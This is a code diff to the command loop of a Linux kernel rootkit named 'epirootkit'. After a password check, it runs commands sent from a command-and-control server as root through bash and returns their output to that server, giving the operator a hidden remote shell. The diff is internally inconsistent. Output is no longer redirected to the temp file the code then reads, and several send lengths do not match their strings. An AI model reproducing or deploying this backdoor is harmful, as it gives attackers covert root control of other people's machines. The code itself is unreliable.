@@ -148,7 +148,7 @@ static int command_loop(void *data) {
     loff_t pos;
     ssize_t rlen;
     char outbuf[1024];
-    const char *tmp_output_path = "/dev/shm/.rk";
+    const char *tmp_output_path = "/tmp/.rk_out";
     int i;
 
     printk(KERN_INFO "epirootkit: command_loop started\n");
@@ -187,10 +187,10 @@ static int command_loop(void *data) {
             // Compare before stripping newlines for authentication
             if (strncmp(decrypted, config.password, strlen(config.password)) == 0) {
                 authenticated = 1;
-                send_to_c2("AUTH OK\n", 8);
+                send_to_c2("AUTH OK\n--EOF--\n", 12);
                 printk(KERN_INFO "epirootkit: Authentication successful\n");
             } else {
-                send_to_c2("AUTH FAIL\n", 10);
+                send_to_c2("AUTH FAIL\n--EOF--\n", 14);
                 printk(KERN_WARNING "epirootkit: Authentication failed, received: '%s'\n", decrypted);
             }
             continue;
@@ -223,52 +223,58 @@ static int command_loop(void *data) {
         }
 
         printk(KERN_INFO "epirootkit: Executing command: %s\n", decrypted);
-        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1",
-                working_directory, decrypted, tmp_output_path);
 
-        argv[0] = "/bin/sh";
+        // Use /bin/bash instead of /bin/sh for better command support
+        argv[0] = "/bin/bash";
         argv[1] = "-c";
+        // Build command with proper redirection
+        if (strlen(working_directory) > 1) {
+            snprintf(full_cmd, sizeof(full_cmd), "cd %s 2>/dev/null && %s 2>&1",
+                    working_directory, decrypted);
+        } else {
+            snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", decrypted);
+        }
         argv[2] = full_cmd;
         argv[3] = NULL;
 
         envp[0] = "HOME=/";
         envp[1] = "TERM=linux";
-        envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
+        envp[2] = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
         envp[3] = NULL;
 
-        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        // Execute command
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
         if (ret != 0) {
             printk(KERN_ERR "epirootkit: Command execution failed (error %d)\n", ret);
-            send_to_c2("(exec error)\n", 13);
-            send_to_c2("--EOF--\n", 8);
+            send_to_c2("Command execution failed\n--EOF--\n", 31);
             continue;
         }
 
-        int sent_output = 0;
+        // Read command output
         f = filp_open(tmp_output_path, O_RDONLY, 0);
-        if (!IS_ERR(f)) {
-            pos = 0;
-            do {
-                memset(outbuf, 0, sizeof(outbuf));
-                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
-                if (rlen > 0) {
-                    send_to_c2(outbuf, rlen);
-                    pos += rlen;
-                    sent_output = 1;
-                }
-            } while (rlen > 0);
-            filp_close(f, NULL);
+        if (IS_ERR(f)) {
+            send_to_c2("(no output)\n--EOF--\n", 18);
+            continue;
+        }
 
-            struct path path;
-            if (kern_path(tmp_output_path, 0, &path) == 0) {
-                vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
+        pos = 0;
+        do {
+            memset(outbuf, 0, sizeof(outbuf));
+            rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
+            if (rlen > 0) {
+                send_to_c2(outbuf, rlen);
+                pos += rlen;
             }
-        }
+        } while (rlen > 0);
 
-        if (!sent_output) {
-            send_to_c2("(no output)\n", 12);
-        }
+        filp_close(f, NULL);
         send_to_c2("--EOF--\n", 8);
+
+        // Try to remove the temporary file
+        f = filp_open(tmp_output_path, O_WRONLY | O_TRUNC, 0);
+        if (!IS_ERR(f)) {
+            filp_close(f, NULL);
+        }
     }
     return 0;
 }
